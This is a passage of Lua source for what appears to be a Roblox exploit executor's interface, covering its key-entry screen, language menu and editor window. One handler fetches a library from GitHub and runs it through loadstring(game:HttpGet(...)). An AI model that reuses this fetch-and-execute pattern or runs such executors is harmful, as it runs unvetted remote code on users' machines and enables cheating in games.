					AnchorPoint = Vector2.new(0.5, 0.5), 
					BackgroundColor3 = Color3.fromHex("ffffff"), 
					BackgroundTransparency = 1, 
					Name = "freemium", 
					Position = UDim2.new(0.5, 0, 0.5, 0), 
					Size = UDim2.new(1, 0, 1, 0)
				}, {
					create("TextButton", { 
						LanguageItem = {
							property = "Text",
							identifier = "EnterKey"
						},
						AnchorPoint = Vector2.new(1, 1), 
						AutoButtonColor = false, 
						BackgroundColor3 = Color3.fromHex("181818"), 
						FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size11, 
						Name = "enterKey", 
						Position = UDim2.new(1, 0, 1, 0), 
						Size = UDim2.new(0, 90, 0, 34), 
						TextColor3 = Color3.fromHex("ebebeb"), 
						TextSize = 11
					}, {
						create("UICorner", { 
							CornerRadius = UDim.new(0, 4), 
							Name = "corner"
						}),
						create("UIStroke", { 
							ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
							Color = Color3.fromHex("141414"), 
							Name = "stroke", 
							Thickness = 1.2
						})
					}),
					create("TextButton", { 
						LanguageItem = {
							property = "Text",
							identifier = "CopyKeyLink"
						},
						AnchorPoint = Vector2.new(0, 1), 
						AutoButtonColor = false, 
						BackgroundColor3 = Color3.fromHex("181818"), 
						FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size11, 
						Name = "getKeyLink", 
						Position = UDim2.new(0, 0, 1, 0), 
						Size = UDim2.new(0, 105, 0, 34), 
						TextColor3 = Color3.fromHex("ebebeb"), 
						TextSize = 11
					}, {
						create("UICorner", { 
							CornerRadius = UDim.new(0, 4), 
							Name = "corner"
						}),
						create("UIStroke", { 
							ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
							Color = Color3.fromHex("141414"), 
							Name = "stroke", 
							Thickness = 1.2
						})
					}),
					create("TextBox", { 
						LanguageItem = {
							property = "PlaceholderText",
							identifier = "Key..."
						},
						AnchorPoint = Vector2.new(0.5, 0), 
						BackgroundColor3 = Color3.fromHex("181818"), 
						FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size11, 
						Name = "keyInput", 
						Position = UDim2.new(0.5, 0, 0, 0), 
						Size = UDim2.new(1, 0, 0, 34), 
						Text = "", 
						TextColor3 = Color3.fromHex("ebebeb"), 
						TextSize = 11, 
						TextXAlignment = Enum.TextXAlignment.Left
					}, {
						create("UICorner", { 
							CornerRadius = UDim.new(0, 4), 
							Name = "corner"
						}),
						create("UIPadding", { 
							Name = "padding", 
							PaddingLeft = UDim.new(0, 8), 
							PaddingRight = UDim.new(0, 8)
						}),
						create("UIStroke", { 
							ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
							Color = Color3.fromHex("141414"), 
							Name = "stroke", 
							Thickness = 1.2
						})
					})
				}),
				create("Frame", { 
					AnchorPoint = Vector2.new(0.5, 0.5), 
					BackgroundColor3 = Color3.fromHex("ffffff"), 
					BackgroundTransparency = 1, 
					Name = "premium", 
					Position = UDim2.new(0.5, 0, 0.5, 0), 
					Size = UDim2.new(1, 0, 1, 0), 
					Visible = false
				}, {
					create("TextButton", { 
						LanguageItem = {
							property = "Text",
							identifier = "SubmitCredentials"
						},
						AnchorPoint = Vector2.new(1, 1), 
						AutoButtonColor = false, 
						BackgroundColor3 = Color3.fromHex("181818"), 
						FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size11, 
						Name = "enterDetails", 
						Position = UDim2.new(1, 0, 1, 0), 
						Size = UDim2.new(0, 130, 0, 34), 
						TextColor3 = Color3.fromHex("ebebeb"), 
						TextSize = 11
					}, {
						create("UICorner", { 
							CornerRadius = UDim.new(0, 4), 
							Name = "corner"
						}),
						create("UIStroke", { 
							ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
							Color = Color3.fromHex("141414"), 
							Name = "stroke", 
							Thickness = 1.2
						})
					}),
					create("TextBox", { 
						LanguageItem = {
							property = "PlaceholderText",
							identifier = "User..."
						},
						AnchorPoint = Vector2.new(0.5, 0), 
						BackgroundColor3 = Color3.fromHex("181818"), 
						FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size11, 
						Name = "userInput", 
						Position = UDim2.new(0.5, 0, 0, 0), 
						Size = UDim2.new(1, 0, 0, 34), 
						Text = uiSettings.userName, 
						TextColor3 = Color3.fromHex("ebebeb"), 
						TextSize = 11, 
						TextXAlignment = Enum.TextXAlignment.Left
					}, {
						create("UICorner", { 
							CornerRadius = UDim.new(0, 4), 
							Name = "corner"
						}),
						create("UIPadding", { 
							Name = "padding", 
							PaddingLeft = UDim.new(0, 8), 
							PaddingRight = UDim.new(0, 8)
						}),
						create("UIStroke", { 
							ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
							Color = Color3.fromHex("141414"), 
							Name = "stroke", 
							Thickness = 1.2
						})
					}),
					create("TextBox", { 
						LanguageItem = {
							property = "PlaceholderText",
							identifier = "Password..."
						},
						AnchorPoint = Vector2.new(0, 1), 
						BackgroundColor3 = Color3.fromHex("181818"), 
						FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size11, 
						Name = "passInput", 
						Position = UDim2.new(0, 0, 1, 0), 
						Size = UDim2.new(1, -140, 0, 34), 
						Text = "", 
						TextColor3 = Color3.fromHex("000000"), 
						TextSize = 11, 
						TextXAlignment = Enum.TextXAlignment.Left
					}, {
						create("UICorner", { 
							CornerRadius = UDim.new(0, 4), 
							Name = "corner"
						}),
						create("UIPadding", { 
							Name = "padding", 
							PaddingLeft = UDim.new(0, 8), 
							PaddingRight = UDim.new(0, 8)
						}),
						create("UIStroke", { 
							ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
							Color = Color3.fromHex("141414"), 
							Name = "stroke", 
							Thickness = 1.2
						}),
						create("TextLabel", { 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "dots", 
							Size = UDim2.new(1, 0, 1, 0), 
							Text = "", 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11, 
							TextXAlignment = Enum.TextXAlignment.Left
						})
					})
				})
			})
		}),
		create("Frame", { 
			AnchorPoint = Vector2.new(1, 0), 
			BackgroundColor3 = Color3.fromHex("ffffff"), 
			Name = "languages", 
			Position = UDim2.new(1, 0, 1, 10), 
			Size = UDim2.new(0, 200, 0, 156), 
			Visible = isFirstTimeExecution
		}, {
			create("UIGradient", { 
				Color = ColorSequence.new({ 
					ColorSequenceKeypoint.new(0, Color3.fromHex("1c1c1c")), 
					ColorSequenceKeypoint.new(1, Color3.fromHex("242424"))
				}), 
				Name = "gradient", 
				Rotation = 78
			}),
			create("UICorner", { 
				CornerRadius = UDim.new(0, 4), 
				Name = "corner"
			}),
			create("ImageLabel", { 
				AnchorPoint = Vector2.new(0.5, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Image = "rbxassetid://12874061329", 
				ImageColor3 = Color3.fromHex("000000"), 
				Name = "blur", 
				Position = UDim2.new(0.5, 0, 0.5, 0), 
				ScaleType = Enum.ScaleType.Slice, 
				Size = UDim2.new(1, 10, 1, 10), 
				SliceCenter = Rect.new(10, 10, 118, 118), 
				ZIndex = 0
			}),
			create("ScrollingFrame", { 
				Active = true, 
				AnchorPoint = Vector2.new(0.5, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				BorderSizePixel = 0, 
				BottomImage = "rbxassetid://12651249430", 
				CanvasSize = UDim2.new(),
				MidImage = "rbxassetid://12651249103", 
				Name = "container", 
				Position = UDim2.new(0.5, 0, 0.5, 0), 
				ScrollBarImageColor3 = Color3.fromHex("141414"), 
				ScrollBarThickness = 4, 
				Size = UDim2.new(1, -16, 1, -16), 
				TopImage = "rbxassetid://12651248921"
			}, {
				create("UIListLayout", { 
					Name = "list", 
					Padding = UDim.new(0, 6), 
					SortOrder = Enum.SortOrder.LayoutOrder
				}),
				create("UIPadding", { 
					Name = "padding", 
					PaddingBottom = UDim.new(0, 1), 
					PaddingLeft = UDim.new(0, 1), 
					PaddingRight = UDim.new(0, 1), 
					PaddingTop = UDim.new(0, 1)
				})
			})
		}),
		create("TextButton", { 
			AutoButtonColor = false, 
			BackgroundColor3 = Color3.fromHex("ffffff"), 
			BorderColor3 = Color3.fromHex("1b2a35"), 
			FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
			FontSize = Enum.FontSize.Size14, 
			Name = "toggleLanguages", 
			Position = UDim2.new(1, 10, 0, 0), 
			Size = UDim2.new(0, 34, 0, 34), 
			Text = "", 
			TextColor3 = Color3.fromHex("000000"), 
			TextSize = 14
		}, {
			create("UICorner", { 
				CornerRadius = UDim.new(0, 4), 
				Name = "corner"
			}),
			create("UIGradient", { 
				Color = ColorSequence.new({ 
					ColorSequenceKeypoint.new(0, Color3.fromHex("1c1c1c")), 
					ColorSequenceKeypoint.new(1, Color3.fromHex("242424"))
				}), 
				Name = "gradient", 
				Rotation = 78
			}),
			create("ImageLabel", { 
				AnchorPoint = Vector2.new(0.5, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Image = "rbxassetid://13084553682", 
				Name = "icon", 
				Position = UDim2.new(0.5, 0, 0.5, 0), 
				Size = UDim2.new(1, -14, 1, -14)
			}),
			create("ImageLabel", { 
				AnchorPoint = Vector2.new(0.5, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Image = "rbxassetid://12874061329", 
				ImageColor3 = Color3.fromHex("000000"), 
				Name = "blur", 
				Position = UDim2.new(0.5, 0, 0.5, 0), 
				ScaleType = Enum.ScaleType.Slice, 
				Size = UDim2.new(1, 10, 1, 10), 
				SliceCenter = Rect.new(10, 10, 118, 118), 
				ZIndex = 0
			})
		})
	});

	--[[ Start ]]--

	local content = keyFrame.content;
	local tabs = content.tabs;

	local function validLogin()
		-- Custom Func
		Load_CustomFunctions()
		table.clear(resizeFunctions);
		gui.keyFrame:Destroy();
		callback();
	end

	--[[ Select Tabs ]]--

	do
		local selectedTab = tabs.freemium;
		local buttons = content.buttons;

		local function selectTab(name)
			local btn, tab = buttons[name], tabs[name];
			if selectedTab ~= tab then
				selectedTab.Visible = false;
				--[[tween(buttons[selectedTab.Name], 0.18, {
					BackgroundTransparency = 1;
				});]]
				selectedTab = tab;
				tab.Visible = true;
				--[[tween(btn, 0.18, {
					BackgroundTransparency = 0;
				});]]
			end
		end

		local buttonList = buttons:GetChildren();
		for i = 1, #buttonList do
			local v = buttonList[i];
			local tab = tabs[v.Name];
			v.MouseButton1Click:Connect(function()
				selectTab(v.Name);
			end);
		end

		resizeFunctions[#resizeFunctions + 1] = function()
			local size = math.max(buttons.freemium.title.TextBounds.X, buttons.premium.title.TextBounds.X) + 47;
			buttons.Size = UDim2.new(0, size, 1, 0);
			tabs.Size = UDim2.new(1, -(size + 16), 1, 0);
		end;
	end

	--[[ Freemium ]]--

	do
		local freeFrame = tabs.freemium;

		local getKeyLink = freeFrame.getKeyLink;
		local enterKey = freeFrame.enterKey;

		getKeyLink.MouseButton1Click:Connect(function()
			local PandaAuth = loadstring(game:HttpGet('https://raw.githubusercontent.com/Panda-Repositories/PandaKS_Libraries/main/library/LuaLib/ROBLOX/PandaBetaLib.lua'))()
			local url = PandaAuth:GetKey("evon")
			_setclipboard(url);
			EvonNotification("Successfully Copied Key")
		end);

		enterKey.MouseButton1Click:Connect(function()
			if EvonCheckKey(freeFrame.keyInput.Text) then
				updateSettings("key", freeFrame.keyInput.Text);
				validLogin();
				if freeFrame.keyInput.Text == "skie" then
					updateSettings("key", "");
				end
			else
				EvonNotification("Invalid Key")
			end
		end);

		resizeFunctions[#resizeFunctions + 1] = function()
			getKeyLink.Size = UDim2.new(0, getKeyLink.TextBounds.X + 30, 0, 34);
			enterKey.Size = UDim2.new(0, enterKey.TextBounds.X + 30, 0, 34);
		end;
	end

	--[[ Adless ]]--

	--[[do
		local paidFrame = tabs.premium;

		local userInput = paidFrame.userInput;
		local passInput = paidFrame.passInput;
		local enterDetails = paidFrame.enterDetails;

		passInput:GetPropertyChangedSignal("Text"):Connect(function()
			local inputLength = #passInput.Text
			passInput.dots.Text = string.rep("•", inputLength);
			passInput.TextTransparency = inputLength == 0 and 0 or 1;
		end);

		enterDetails.MouseButton1Click:Connect(function()
			if CHECK_WHITELIST_FUNCTION_HERE(userInput.Text, passInput.Text) then
				updateSettings("userName", userInput.Text);
				validLogin();
			end
		end);

		resizeFunctions[#resizeFunctions + 1] = function()
			enterDetails.Size = UDim2.new(0, enterDetails.TextBounds.X + 30, 0, 34);
			passInput.Size = UDim2.new(1, -(enterDetails.TextBounds.X + 40), 0, 34);
		end;
	end]]

	--[[ Languages ]]--

	do
		do
			local isOpen = isFirstTimeExecution;

			keyFrame.toggleLanguages.MouseButton1Click:Connect(function()
				isOpen = not isOpen;
				keyFrame.languages.Visible = isOpen;
			end);
		end

		local template = create("TextButton", { 
			AutoButtonColor = false,
			BackgroundColor3 = Color3.fromHex("ffffff"), 
			BackgroundTransparency = 1, 
			Text = "",
			Name = "languageExample", 
			Size = UDim2.new(1, 0, 0, 30)
		}, {
			create("Frame", { 
				BackgroundColor3 = Color3.fromHex("181818"), 
				Name = "flagContainer", 
				Size = UDim2.new(0, 40, 0, 30)
			}, {
				create("UIStroke", { 
					ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
					Color = Color3.fromHex("141414"), 
					Name = "stroke", 
					Thickness = 1.2
				}),
				create("UICorner", { 
					CornerRadius = UDim.new(0, 4), 
					Name = "corner"
				}),
				create("ImageLabel", { 
					AnchorPoint = Vector2.new(0.5, 0.5), 
					BackgroundColor3 = Color3.fromHex("ffffff"), 
					BackgroundTransparency = 1, 
					Image = "", 
					Name = "icon", 
					Position = UDim2.new(0.5, 0, 0.5, 0), 
					Size = UDim2.new(1, -8, 1, -6)
				})
			}),
			create("TextLabel", { 
				AnchorPoint = Vector2.new(1, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
				FontSize = Enum.FontSize.Size11, 
				Name = "title", 
				Position = UDim2.new(1, 0, 0.5, 0), 
				Size = UDim2.new(1, -50, 1, 0), 
				Text = "", 
				TextColor3 = Color3.fromHex("ebebeb"), 
				TextSize = 11, 
				TextXAlignment = Enum.TextXAlignment.Left
			})
		});

		local languages = keyFrame.languages;

		local container = languages.container;

		container.list:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			container.CanvasSize = UDim2.new(0, 0, 0, container.list.AbsoluteContentSize.Y + 2);			
		end);

		for i, v in next, sortedLanguageDatabase do
			local clone = template:Clone();
			clone.Name = v.key;
			clone.title.Text = v.value.indicator;
			clone.flagContainer.icon.Image = v.value.flag;

			clone.MouseButton1Click:Connect(function()
				updateSettings("language", v.key);
			end);

			clone.Parent = container;
		end
	end

	changeLanguage(uiSettings.language);

	if EvonCheckKey(uiSettings.key) then
		validLogin();
	else
		EvonNotification("Saved Key is no longer valid")
	end
end

local function loadMainUI()
	local toggleMain = create("TextButton", { 
		AnchorPoint = Vector2.new(0.5, 0.5), 
		AutoButtonColor = false, 
		BackgroundColor3 = Color3.fromHex("ffffff"), 
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
		FontSize = Enum.FontSize.Size14, 
		Name = "toggleMain", 
		Parent = gui, 
		Position = UDim2.new(1, -25, 0.5, 0), 
		Size = UDim2.new(0, 40, 0, 40), 
		Text = "", 
		TextColor3 = Color3.fromHex("000000"), 
		TextSize = 14, 
		ZIndex = 99
	}, {
		create("UICorner", { 
			CornerRadius = UDim.new(0, 4), 
			Name = "corner"
		}),
		create("UIGradient", { 
			Color = ColorSequence.new({ 
				ColorSequenceKeypoint.new(0, Color3.fromHex("1c1c1c")), 
				ColorSequenceKeypoint.new(1, Color3.fromHex("242424"))
			}), 
			Name = "gradient", 
			Rotation = 78
		}),
		create("ImageLabel", { 
			AnchorPoint = Vector2.new(0.5, 0.5), 
			BackgroundColor3 = Color3.fromHex("ffffff"), 
			BackgroundTransparency = 1, 
			Image = "rbxassetid://15984664361", 
			ImageColor3 = Color3.fromRGB(151, 0, 255),
			Name = "icon", 
			Position = UDim2.new(0.5, 0, 0.5, 0), 
			Size = UDim2.new(1, -6, 1, -6), 
			ZIndex = 99
		})
	});

	local main = create("Frame", { 
		AnchorPoint = Vector2.new(0.5, 0.5), 
		BackgroundColor3 = Color3.fromHex("ffffff"), 
		BorderSizePixel = 0, 
		Name = "main", 
		Parent = gui, 
		Position = UDim2.new(0.5, 0, 0.5, 0), 
		Size = UDim2.new(1, -110, 1, -80),
		Visible = false
	}, {
		create("UIGradient", { 
			Color = ColorSequence.new({ 
				ColorSequenceKeypoint.new(0, Color3.fromHex("1c1c1c")), 
				ColorSequenceKeypoint.new(1, Color3.fromHex("242424"))
			}), 
			Name = "gradient", 
			Rotation = 78
		}),
		create("Frame", { 
			BackgroundColor3 = Color3.fromHex("181818"), 
			BorderSizePixel = 0, 
			Name = "left", 
			Size = UDim2.new(0, 38, 1, 0)
		}, {
			create("UICorner", { 
				CornerRadius = UDim.new(0, 4), 
				Name = "corner"
			}),
			create("ImageLabel", { 
				AnchorPoint = Vector2.new(0.5, 0), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Image = "rbxassetid://15984664361", 
				ImageColor3 = Color3.fromRGB(151, 0, 255),
				Name = "icon", 
				Position = UDim2.new(0.5, 0, 0, 8), 
				Size = UDim2.new(0, 28, 0, 28)
			}),
			create("Frame", { 
				AnchorPoint = Vector2.new(0.5, 1), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Name = "buttons", 
				Position = UDim2.new(0.5, 0, 1, 0), 
				Size = UDim2.new(1, -8, 1, -44)
			}, {
				create("UIListLayout", { 
					Name = "list", 
					Padding = UDim.new(0, 4), 
					SortOrder = Enum.SortOrder.LayoutOrder
				}),
				create("TextButton", { 
					AnchorPoint = Vector2.new(0.5, 0.5), 
					AutoButtonColor = false, 
					BackgroundColor3 = Color3.fromHex("303030"), 
					FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size14, 
					Name = "editor", 
					Position = UDim2.new(0.5, 0, 0.5, 0), 
					Size = UDim2.new(0, 30, 0, 30), 
					Text = "", 
					TextColor3 = Color3.fromHex("000000"), 
					TextSize = 14
				}, {
					create("ImageLabel", { 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Image = "rbxassetid://12874034829", 
						Name = "icon", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						Size = UDim2.new(1, -10, 1, -10)
					}),
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					})
				}),
				create("TextButton", { 
					AnchorPoint = Vector2.new(0.5, 0.5), 
					AutoButtonColor = false, 
					BackgroundColor3 = Color3.fromHex("303030"), 
					BackgroundTransparency = 1, 
					FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size14, 
					Name = "games", 
					Position = UDim2.new(0.5, 0, 0.5, 0), 
					Size = UDim2.new(0, 30, 0, 30), 
					Text = "", 
					TextColor3 = Color3.fromHex("000000"), 
					TextSize = 14
				}, {
					create("ImageLabel", { 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Image = "rbxassetid://12874034639", 
						Name = "icon", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						Size = UDim2.new(1, -10, 1, -10)
					}),
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					})
				}),
				create("TextButton", { 
					AnchorPoint = Vector2.new(0.5, 0.5), 
					AutoButtonColor = false, 
					BackgroundColor3 = Color3.fromHex("303030"), 
					BackgroundTransparency = 1, 
					FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size14, 
					Name = "console", 
					Position = UDim2.new(0.5, 0, 0.5, 0), 
					Size = UDim2.new(0, 30, 0, 30), 
					Text = "", 
					TextColor3 = Color3.fromHex("000000"), 
					TextSize = 14
				}, {
					create("ImageLabel", { 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Image = "rbxassetid://12874035024", 
						Name = "icon", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						Size = UDim2.new(1, -10, 1, -10)
					}),
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					})
				}),
				create("TextButton", { 
					AnchorPoint = Vector2.new(0.5, 0.5), 
					AutoButtonColor = false, 
					BackgroundColor3 = Color3.fromHex("303030"), 
					BackgroundTransparency = 1, 
					FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size14, 
					Name = "settings", 
					Position = UDim2.new(0.5, 0, 0.5, 0), 
					Size = UDim2.new(0, 30, 0, 30), 
					Text = "", 
					TextColor3 = Color3.fromHex("000000"), 
					TextSize = 14
				}, {
					create("ImageLabel", { 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Image = "rbxassetid://12874034503", 
						Name = "icon", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						Size = UDim2.new(1, -10, 1, -10)
					}),
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					})
				})
			}),
			create("Frame", { 
				AnchorPoint = Vector2.new(1, 0), 
				BackgroundColor3 = Color3.fromHex("181818"), 
				BorderSizePixel = 0, 
				Name = "topRightCover", 
				Position = UDim2.new(1, 0, 0, 0), 
				Size = UDim2.new(0, 4, 0, 4)
			}),
			create("Frame", { 
				AnchorPoint = Vector2.new(1, 1), 
				BackgroundColor3 = Color3.fromHex("181818"), 
				BorderSizePixel = 0, 
				Name = "bottomRightCover", 
				Position = UDim2.new(1, 0, 1, 0), 
				Size = UDim2.new(0, 4, 0, 4)
			})
		}),
		create("UICorner", { 
			CornerRadius = UDim.new(0, 4), 
			Name = "corner"
		}),
		create("TextButton", { 
			AutoButtonColor = false, 
			BackgroundColor3 = Color3.fromHex("ffffff"), 
			BackgroundTransparency = 1, 
			FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
			FontSize = Enum.FontSize.Size14, 
			Name = "clickThroughBlocker", 
			Size = UDim2.new(1, 0, 1, 0), 
			Text = "", 
			TextColor3 = Color3.fromHex("000000"), 
			TextSize = 14, 
			ZIndex = 0
		}),
		create("Folder", { 
			Name = "tabs"
		}, {
			create("Frame", { 
				AnchorPoint = Vector2.new(1, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Name = "editor", 
				Position = UDim2.new(1, 0, 0.5, 0), 
				Size = UDim2.new(1, -38, 1, 0)
			}, {
				create("UIListLayout", {
					Name = "list", 
					FillDirection = Enum.FillDirection.Horizontal, 
					Padding = UDim.new(0, 8), 
					SortOrder = Enum.SortOrder.LayoutOrder
				}),
				create("UIPadding", {
					Name = "padding",
					PaddingBottom = UDim.new(0, 8), 
					PaddingLeft = UDim.new(0, 8), 
					PaddingRight = UDim.new(0, 8), 
					PaddingTop = UDim.new(0, 8)
				}),
				create("Frame", { 
					AnchorPoint = Vector2.new(0, 0.5), 
					BackgroundColor3 = Color3.fromHex("181818"), 
					Name = "main", 
					Position = UDim2.new(0, 8, 0.5, 0), 
					Size = UDim2.new(1, -118, 1, 0)
				}, {
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("UIListLayout", { 
						FillDirection = Enum.FillDirection.Horizontal, 
						Name = "list", 
						Padding = UDim.new(0, 4), 
						SortOrder = Enum.SortOrder.LayoutOrder
					}),
					create("ScrollingFrame", { 
						Active = true, 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						BorderSizePixel = 0, 
						BottomImage = "rbxassetid://12651249430", 
						CanvasSize = UDim2.new(0, 6, 1, 0), 
						MidImage = "rbxassetid://12651249103", 
						Name = "lineNumbers", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						ScrollBarImageColor3 = Color3.fromHex("484848"), 
						ScrollBarThickness = 0, 
						ScrollingDirection = Enum.ScrollingDirection.Y, 
						ScrollingEnabled = false, 
						Size = UDim2.new(0, 6, 1, 0), 
						TopImage = "rbxassetid://12651248921"
					}, {
						create("TextLabel", { 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "label", 
							Size = UDim2.new(1, 0, 1, 0), 
							Text = "1", 
							TextColor3 = Color3.fromHex("d2d2d2"), 
							TextSize = 11, 
							TextXAlignment = Enum.TextXAlignment.Right, 
							TextYAlignment = Enum.TextYAlignment.Top
						})
					}),
					create("UIPadding", { 
						Name = "padding", 
						PaddingBottom = UDim.new(0, 8), 
						PaddingLeft = UDim.new(0, 8), 
						PaddingRight = UDim.new(0, 8), 
						PaddingTop = UDim.new(0, 8)
					}),
					create("Frame", { 
						BackgroundColor3 = Color3.fromHex("b2b2b2"), 
						BorderSizePixel = 0, 
						Name = "separator", 
						Size = UDim2.new(0, 1, 1, 0)
					}),
					create("ScrollingFrame", { 
						Active = true, 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						BorderSizePixel = 0, 
						BottomImage = "rbxassetid://12651249430", 
						CanvasSize = UDim2.new(1, -15, 1, 0), 
						MidImage = "rbxassetid://12651249103", 
						Name = "container", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						ScrollBarImageColor3 = Color3.fromHex("484848"), 
						ScrollBarThickness = 4, 
						Size = UDim2.new(1, -15, 1, 0), 
						TopImage = "rbxassetid://12651248921"
					}, {
						create("TextBox", { 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							ClearTextOnFocus = false, 
							FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							MultiLine = true, 
							Name = "content", 
							Size = UDim2.new(1, 0, 1, 0), 
							Text = uiSettings.editorInit, 
							TextColor3 = Color3.fromHex("b2b2b2"), 
							TextSize = 11, 
							TextTruncate = Enum.TextTruncate.AtEnd, 
							TextWrap = true, 
							TextWrapped = true, 
							TextXAlignment = Enum.TextXAlignment.Left, 
							TextYAlignment = Enum.TextYAlignment.Top
						})
					}),
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("141414"), 
						Name = "stroke", 
						Thickness = 1.2
					})
				}),
				create("Frame", { 
					BackgroundColor3 = Color3.fromHex("181818"), 
					BorderSizePixel = 0, 
					Name = "right", 
					Size = UDim2.new(0, 110, 1, 0)
				}, {
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("Frame", { 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Name = "buttons", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						Size = UDim2.new(1, -8, 1, -8)
					}, {
						create("UIListLayout", { 
							Name = "list", 
							Padding = UDim.new(0, 4), 
							SortOrder = Enum.SortOrder.LayoutOrder
						}),
						create("TextLabel", { 
							LanguageItem = {
								property = "Text",
								identifier = "Editor"
							},
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size12, 
							Name = "boxLabel", 
							Size = UDim2.new(1, 0, 0, 16), 
							TextColor3 = Color3.fromHex("bebebe"), 
							TextSize = 12, 
							TextXAlignment = Enum.TextXAlignment.Left, 
							TextYAlignment = Enum.TextYAlignment.Bottom
						}),
